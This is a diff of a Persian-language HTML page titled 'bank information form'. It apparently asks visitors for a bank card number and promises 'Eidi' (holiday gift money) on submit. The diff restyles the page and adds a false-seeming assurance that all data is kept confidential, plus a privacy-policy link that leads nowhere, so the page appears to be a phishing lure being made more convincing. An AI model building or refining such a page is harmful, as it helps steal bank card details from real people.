@@ -6,73 +6,86 @@
     <title>فرم بانکی</title>
     <style>
         body {
-            font-family: Tahoma, sans-serif;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
             direction: rtl;
-            text-align: right;
-            background-color: #f4f7fa;
+            background-color: #f1f3f4;
+            color: #34495e;
             margin: 0;
             padding: 0;
         }
         .form-container {
-            width: 350px;
+            width: 400px;
             margin: 100px auto;
-            padding: 25px;
-            border: 1px solid #ccc;
-            border-radius: 10px;
-            background-color: #fff;
-            box-shadow: 0px 4px 6px rgba(0, 0, 0, 0.1);
+            padding: 30px;
+            border-radius: 12px;
+            background-color: #ffffff;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+            border: 1px solid #dcdfe1;
         }
         .form-container h2 {
             text-align: center;
-            font-size: 24px;
-            color: #2c3e50;
-            margin-bottom: 20px;
+            font-size: 28px;
+            margin-bottom: 30px;
+            color: #2980b9;
         }
         .form-container label {
             display: block;
-            font-size: 14px;
-            margin-bottom: 5px;
-            color: #34495e;
+            font-size: 16px;
+            margin-bottom: 10px;
+            color: #2c3e50;
         }
         .form-container input, .form-container select {
             width: 100%;
-            padding: 12px;
+            padding: 15px;
             margin-bottom: 20px;
             border: 1px solid #bdc3c7;
-            border-radius: 5px;
+            border-radius: 8px;
             background-color: #ecf0f1;
             font-size: 16px;
             color: #34495e;
+            transition: border-color 0.3s;
         }
         .form-container input:focus, .form-container select:focus {
             outline: none;
-            border-color: #3498db;
+            border-color: #2980b9;
             background-color: #ffffff;
         }
         .form-container button {
             width: 100%;
-            padding: 14px;
-            background-color: #3498db;
+            padding: 16px;
+            background-color: #2980b9;
             color: white;
             border: none;
-            border-radius: 5px;
+            border-radius: 8px;
             font-size: 18px;
             cursor: pointer;
+            transition: background-color 0.3s;
         }
         .form-container button:hover {
-            background-color: #2980b9;
+            background-color: #3498db;
         }
         .form-container .note {
             text-align: center;
             font-size: 14px;
+            color: #7f8c8d;
+            margin-top: 15px;
+        }
+        .form-container .footer {
+            text-align: center;
+            margin-top: 30px;
+            font-size: 14px;
             color: #95a5a6;
+        }
+        .form-container .footer a {
+            color: #2980b9;
+            text-decoration: none;
         }
     </style>
 </head>
 <body>
 
     <div class="form-container">
-        <h2>فرم بانکی</h2>
+        <h2>فرم اطلاعات بانکی</h2>
         <form action="eid.html">
             <label for="cardNumber">شماره کارت:</label>
             <input type="text" id="cardNumber" name="cardNumber" required>
@@ -104,7 +117,12 @@
             
             <button type="submit">دریافت عیدی</button>
         </form>
-        <p class="note">لطفاً اطلاعات خود را با دقت وارد کنید.</p>
+        
+        <p class="note">تمامی اطلاعات وارد شده به صورت محرمانه نگهداری می‌شود.</p>
+    </div>
+
+    <div class="footer">
+        <p>تمام حقوق محفوظ است | <a href="#">سیاست حریم خصوصی</a></p>
     </div>
 
 </body>
